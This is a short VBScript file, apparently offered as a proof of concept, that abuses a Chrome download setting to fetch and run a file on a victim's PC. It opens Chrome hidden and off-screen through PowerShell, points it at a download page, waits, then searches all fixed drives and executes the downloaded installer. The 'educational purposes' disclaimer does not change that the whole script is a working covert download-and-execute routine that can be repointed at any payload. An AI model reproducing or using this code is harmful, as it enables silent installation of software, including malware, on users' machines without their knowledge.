'This script exploits small bug in Chrome CLS to silently download files on victims PC. 
'It will only affect users who turned 'Ask where to save each file before downloading' option off. 
'Bug is reported to Chrome (not approved) and expected to get fixed soon and the script it is only for educational purposes

Dim objFso,oShell
Set objFso = CreateObject("Scripting.FileSystemObject") 
Set oShell = WScript.CreateObject("WScript.Shell") 

Main() 

Sub Main()
 Payload() 
 WScript.Sleep 5000 
 SearchAndRun() 
End Sub 

Sub Payload() 
 Dim url,sph
 url = "https://www.opera.com/computer/thanks?ni=stable&os=windows" 
 psh = "Powershell.exe Start-Process -FilePath 'chrome.exe' -ArgumentList '--window-position=-500,-500 " + url + "' -WindowStyle Hidden" 
 oShell.Run(psh),vbHide  
End Sub

Sub SearchAndRun() 
 Dim drives,drive,dname 
 Set drives = objFso.Drives
 
 For Each drive in drives 
  If drive.DriveType = 2 Then 
   dname = drive.DriveLetter + ":" 
   Research(dname) 
  End If 
 Next 
End Sub 

Sub Research(mypath) 
 On Error Resume Next 
 Dim folder,files,file,filename,subdir 
 Set folder = objFso.GetFolder(mypath) 
 Set files = folder.Files 

 For Each file in files 
  If file <> "" Then 
   filename = objFso.GetFileName(file) 
   If filename = "OperaSetup.exe" Then 
    oShell.Run(file) 
   End If 
  End If 
 Next 

 For Each subdir in folder.SubFolders 
  Research(subdir) 
 Next 
End Sub 
